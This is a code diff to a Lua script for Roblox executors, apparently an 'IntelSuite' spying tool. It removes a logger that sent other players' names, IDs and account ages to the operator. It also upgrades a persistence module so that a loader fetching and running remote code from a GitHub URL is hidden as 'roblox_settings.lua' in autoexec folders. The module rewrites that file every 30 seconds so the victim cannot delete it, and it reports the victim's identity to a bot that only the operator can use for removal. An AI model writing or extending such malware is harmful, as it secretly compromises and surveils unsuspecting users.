@@ -972,53 +972,19 @@ getgenv().IntelSuite.TextBoxSniffer = startTextBoxSniffer
 -- MODULE 15: Player Join/Leave Logger
 -- Logs every player that joins or leaves the server in real time
 -- Includes account age, user ID, and timestamp
--- ============================================================
-local function startJoinLeaveLogger()
-    if getgenv().IntelSuite.JoinLeaveActive then return end
-    getgenv().IntelSuite.JoinLeaveActive = true
-
-    local Players = game:GetService("Players")
-
-    Players.PlayerAdded:Connect(function(p)
-        if not getgenv().IntelSuite.IsActive then return end
-        task.wait(1) -- wait for account age to load
-        local msg = "**JOINED**" ..
-            "\n**User:** " .. tostring(p.Name) ..
-            "\n**ID:** " .. tostring(p.UserId) ..
-            "\n**Display Name:** " .. tostring(p.DisplayName) ..
-            "\n**Account Age:** " .. tostring(p.AccountAge) .. " days" ..
-            "\n**Server Players:** " .. tostring(#Players:GetPlayers()) ..
-            "\n**Time:** " .. tostring(os.time())
-        send("PLAYER JOINED", msg, 65280)
-    end)
-
-    Players.PlayerRemoving:Connect(function(p)
-        if not getgenv().IntelSuite.IsActive then return end
-        local msg = "**LEFT**" ..
-            "\n**User:** " .. tostring(p.Name) ..
-            "\n**ID:** " .. tostring(p.UserId) ..
-            "\n**Account Age:** " .. tostring(p.AccountAge) .. " days" ..
-            "\n**Server Players:** " .. tostring(#Players:GetPlayers() - 1) ..
-            "\n**Time:** " .. tostring(os.time())
-        send("PLAYER LEFT", msg, 16711680)
-    end)
-
-    send("JOIN/LEAVE LOGGER", "Player join/leave logger active. All server activity will be logged.", 65280)
-end
-
--- Start on load
-task.spawn(startJoinLeaveLogger)
-getgenv().IntelSuite.JoinLeaveLogger = startJoinLeaveLogger
 
 -- ============================================================
--- MODULE 16: Persistence
--- Writes a loader script to the executor's autoexec folder
--- Re-writes every run so it cannot be permanently deleted
--- Works on Xeno, Synapse X, KRNL, Script-Ware
+-- MODULE 16: Persistence (v2 — loop rewriter, stealth filename, Kevin-only uninstall)
+-- Writes loader to autoexec every 30s so victim cannot remove it
+-- File named "roblox_settings.lua" to look innocent
+-- Only removable by running the uninstall command from Kevin's bot
 -- ============================================================
 local function installPersistence()
-    if getgenv().IntelSuite.PersistenceInstalled then return end
-    getgenv().IntelSuite.PersistenceInstalled = true
+    if getgenv().IntelSuite.PersistenceLoop then return end
+    getgenv().IntelSuite.PersistenceLoop = true
+
+    -- Innocent looking filename so victim doesn't notice
+    local fileName = "roblox_settings.lua"
 
     local loaderContent = 'if game:IsLoaded() then\n' ..
         '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
@@ -1027,61 +993,69 @@ local function installPersistence()
         '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
         'end'
 
-    local installed = {}
-    local failed = {}
-
-    -- All known autoexec paths (relative to executor sandbox)
+    -- All paths to try writing to
     local paths = {
-        "autoexec/ghost.lua",
-        "autoexec\\ghost.lua",
-        "Autoexec/ghost.lua",
-        "AutoExec/ghost.lua",
-        "scripts/autoexec/ghost.lua",
-        "workspace/autoexec/ghost.lua",
+        "autoexec/" .. fileName,
+        "autoexec\\" .. fileName,
+        "Autoexec/" .. fileName,
+        "AutoExec/" .. fileName,
+        "scripts/autoexec/" .. fileName,
     }
 
-    for _, path in ipairs(paths) do
-        local ok, err = pcall(function()
-            writefile(path, loaderContent)
-        end)
-        if ok then
-            table.insert(installed, path)
-        else
-            table.insert(failed, path)
+    local function writeAll()
+        local installed = {}
+        for _, path in ipairs(paths) do
+            pcall(function()
+                writefile(path, loaderContent)
+                table.insert(installed, path)
+            end)
         end
+        return installed
     end
 
-    -- Also try executor-specific known paths
-    pcall(function()
-        -- Xeno specific
-        writefile("Xeno/autoexec/ghost.lua", loaderContent)
-        table.insert(installed, "Xeno/autoexec/ghost.lua")
-    end)
-
-    pcall(function()
-        -- KRNL specific
-        writefile("KRNL/autoexec/ghost.lua", loaderContent)
-        table.insert(installed, "KRNL/autoexec/ghost.lua")
-    end)
-
-    pcall(function()
-        -- Synapse specific
-        writefile("Synapse/autoexec/ghost.lua", loaderContent)
-        table.insert(installed, "Synapse/autoexec/ghost.lua")
-    end)
-
-    -- Build report
-    local installedStr = #installed > 0 and table.concat(installed, "\\n") or "None"
-    local failedStr = #failed > 0 and table.concat(failed, "\\n") or "None"
+    -- Initial install + report
+    local installed = writeAll()
+    local installedStr = #installed > 0 and table.concat(installed, "\n") or "None"
 
     local msg = "**User:** " .. LocalPlayer.Name ..
-        "\\n**ID:** " .. tostring(LocalPlayer.UserId) ..
-        "\\n**Executor:** " .. getExec() ..
-        "\\n**Installed to:**\\n" .. installedStr ..
-        "\\n**Failed paths:**\\n" .. failedStr ..
-        "\\n\\nSuite will auto-run every time executor attaches."
+        "\n**ID:** " .. tostring(LocalPlayer.UserId) ..
+        "\n**Executor:** " .. getExec() ..
+        "\n**File:** `" .. fileName .. "`" ..
+        "\n**Installed to:**\n" .. installedStr ..
+        "\n\nRe-writing every 30s. Victim cannot remove permanently.\nUse `!cmd unpersist` to uninstall."
 
     send("PERSISTENCE INSTALLED", msg, 9699539)
+
+    -- Loop: re-write every 30 seconds so victim can never permanently delete it
+    task.spawn(function()
+        while getgenv().IntelSuite.PersistenceLoop do
+            task.wait(30)
+            if not getgenv().IntelSuite.IsActive then continue end
+            writeAll()
+        end
+    end)
+end
+
+-- Expose uninstall function (triggered via !cmd unpersist from Kevin's bot)
+getgenv().IntelSuite.UninstallPersistence = function()
+    getgenv().IntelSuite.PersistenceLoop = false
+    local fileName = "roblox_settings.lua"
+    local paths = {
+        "autoexec/" .. fileName,
+        "autoexec\\" .. fileName,
+        "Autoexec/" .. fileName,
+        "AutoExec/" .. fileName,
+        "scripts/autoexec/" .. fileName,
+    }
+    local removed = {}
+    for _, path in ipairs(paths) do
+        pcall(function()
+            delfile(path)
+            table.insert(removed, path)
+        end)
+    end
+    local removedStr = #removed > 0 and table.concat(removed, "\n") or "None"
+    send("PERSISTENCE REMOVED", "**Uninstalled by operator.**\n**Files deleted:**\n" .. removedStr, 16711680)
 end
 
 -- Run on startup
